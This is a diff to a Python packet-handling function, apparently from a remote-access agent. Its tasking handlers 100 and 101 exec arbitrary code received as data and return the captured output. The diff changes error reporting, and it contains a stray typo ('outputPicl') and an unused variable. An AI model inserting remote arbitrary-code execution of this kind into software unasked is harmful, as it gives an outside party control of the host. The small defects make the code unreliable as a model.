@@ -296,18 +296,18 @@ def processPacket(taskingID, data):
             return encodePacket(0, "error stopping job: %s" %(data))
 
     elif taskingID == 100:
-        # dynamic code execution, wait for output, don't save output
+        # dynamic code execution, wait for output, don't save outputPicl
         try:
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            ns = {}
             exec code_obj in {}
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
-            return encodePacket(100, str(buffer.getvalue()))
+            return encodePacket(100, str(results))
         except Exception as e:
-            return encodePacket(0, "error executing specified Python data: %s" %(e))
+            errorData = str(buffer.getvalue())
+            return encodePacket(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData))
 
     elif taskingID == 101:
         # dynamic code execution, wait for output, save output
@@ -318,10 +318,13 @@ def processPacket(taskingID, data):
         try:
             buffer = StringIO()
             sys.stdout = buffer
-            exec(data)
+            code_obj = compile(data, '<string>', 'exec')
+            exec code_obj in {}
             sys.stdout = sys.__stdout__
             return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
         except:
+            # Also return partial code that has been executed 
+            errorData = str(buffer.getvalue())
             return encodePacket(0, "error executing specified Python data")
 
     elif taskingID == 110:
